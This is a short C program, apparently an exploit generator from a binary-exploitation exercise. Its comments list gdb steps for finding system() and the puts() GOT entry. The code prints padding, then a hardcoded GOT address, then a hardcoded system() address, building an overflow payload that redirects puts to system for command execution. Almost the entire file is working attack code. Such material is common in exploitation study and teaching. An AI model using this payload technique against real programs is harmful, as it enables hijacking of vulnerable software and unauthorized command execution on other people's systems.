#include <stdio.h>

// 1. Get system() dynamic linker address using `print &system`
// 2. Allow puts() to run once
// 3. Get puts() address using `disassemble main`
// 4. Get puts() GOT address using `disassemble <puts address>`
// 5. Replace body1's address with puts() GOT address

void main()
{
    unsigned int puts_got_address = 0x0804a014;
    char* padding = "000100020003000400050006000700080009001000110012001300140015001600170018001900200021"
                    "002200230024";
    printf("%s%s\n", padding, (char*) &puts_got_address);

    unsigned int system_dynamic_linker_address = 0xb7e42db0;
    printf("%s\n", (char*) &system_dynamic_linker_address);
}
